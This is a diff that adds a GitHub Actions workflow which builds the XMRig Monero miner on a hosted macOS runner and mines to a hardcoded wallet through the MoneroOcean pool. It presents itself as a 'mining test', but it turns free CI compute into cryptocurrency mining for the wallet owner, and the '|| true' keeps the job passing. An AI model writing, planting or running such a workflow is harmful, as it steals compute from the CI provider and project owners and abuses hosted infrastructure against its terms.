@@ -1,0 +1,38 @@
+name: macOS Mining Test (Fixed)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test-macos-mining:
+    runs-on: macos-latest
+    timeout-minutes: 15
+
+    steps:
+    - name: 📦 Install dependencies
+      run: |
+        brew install git cmake libuv hwloc openssl@3
+
+    - name: ⬇️ Clone XMRig
+      run: |
+        cd /tmp && rm -rf xmrig-test
+        git clone --depth 1 https://github.com/xmrig/xmrig.git xmrig-test
+
+    - name: 🛠️ Build XMRig for macOS
+      run: |
+        cd /tmp/xmrig-test
+        mkdir -p build
+        cd build
+        cmake .. -DCMAKE_BUILD_TYPE=Release
+        make -j$(sysctl -n hw.ncpu)
+
+    - name: ⚙️ Configure miner
+      run: |
+        echo "WALLET=43ihxdg6U74LfU1aYnB2f3W6bMtNpkrBLPuhDUJT2QYJ87ax8jxuHUPDad4fH2UmcK9YJah5wjJCmS7cMoFf8zkF7e5ArBb" >> $GITHUB_ENV
+        echo "POOL=gulf.moneroocean.stream:10128" >> $GITHUB_ENV
+        echo "WORKER=github-macos-test-$(date +%s)" >> $GITHUB_ENV
+
+    - name: 🚀 Run miner
+      run: |
+        cd /tmp/xmrig-test/build
+        ./xmrig -o $POOL -u $WALLET -p $WORKER --cpu-max-threads-hint=10 || true
